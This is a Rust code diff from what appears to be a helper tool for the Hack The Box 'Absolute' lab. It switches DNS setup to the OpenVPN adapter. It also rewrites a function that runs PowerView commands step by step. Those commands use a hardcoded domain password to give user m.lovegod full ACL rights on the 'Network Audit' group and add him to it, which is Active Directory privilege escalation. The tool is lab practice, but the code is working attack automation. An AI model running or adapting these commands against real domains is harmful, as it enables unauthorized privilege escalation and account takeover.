@@ -47,18 +47,18 @@ pub fn set_primary_dns() {
     stdin().read_line(&mut ip).expect("Failed to read the input");
     let ip = ip.trim();
 
-    // Obtain the name of the LAN adapter
+    // Obtain the name of the OpenVPN LAN adapter
     let output = Command::new("powershell")
         .args(&[
             "-Command",
-            "Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' -and $_.MediaType -eq '802.3'} | Select-Object -ExpandProperty Name",
+            "Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' -and $_.Description -like '*OpenVPN*'} | Select-Object -ExpandProperty Name",
         ])
         .output()
         .expect("failed to execute powershell command");
 
     let adapter_name = String::from_utf8_lossy(&output.stdout).trim().to_string();
 
-    // Set the primary DNS for the LAN adapter
+    // Set the primary DNS for the OpenVPN LAN adapter
     let dns_output = Command::new("powershell")
         .args(&[
             "-Command",
@@ -77,23 +77,41 @@ pub fn set_primary_dns() {
 }
 
 pub fn run_powershell_commands() {
-    // Prepare and run the PowerShell commands
-    let commands = r#"
-        Import-Module .\PowerView.ps1
-        $SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)
-        Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController absolute.htb -PrincipalIdentity "m.lovegod"
-        Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server absolute.htb
-    "#;
+    // Prepare the PowerShell commands and custom messages
+    let commands_and_messages = vec![
+        ("Import-Module .\\PowerView.ps1", "PowerView module imported"),
+        (
+            r#"$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force"#,
+            "$SecPassword variable set",
+        ),
+        (
+            r#"$Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)"#,
+            "$Cred variable set",
+        ),
+        (
+            r#"Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController absolute.htb -PrincipalIdentity "m.lovegod""#,
+            "DomainObjectAcl set",
+        ),
+        (
+            r#"Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server absolute.htb"#,
+            "Added m.lovegod to Network Audit group",
+        ),
+    ];
 
-    let output = Command::new("powershell")
-        .arg("-Command")
-        .arg(commands)
-        .output()
-        .expect("failed to execute PowerShell commands");
+    // Execute each command and print the custom message
+    for (i, (command, message)) in commands_and_messages.iter().enumerate() {
+        let output = Command::new("powershell")
+            .arg("-Command")
+            .arg(command)
+            .output()
+            .expect("failed to execute PowerShell command");
 
-    // Print the command output to the console
-    let output_str = String::from_utf8_lossy(&output.stdout);
-    println!("{}", output_str);
-    println!("{}", String::from_utf8_lossy(&output.stderr));
+        // Print the custom message
+        println!("Command {}: {}", i + 1, message);
+
+        // Print the command output to the console
+        let output_str = String::from_utf8_lossy(&output.stdout);
+        println!("{}", output_str);
+        println!("{}", String::from_utf8_lossy(&output.stderr));
+    }
 }
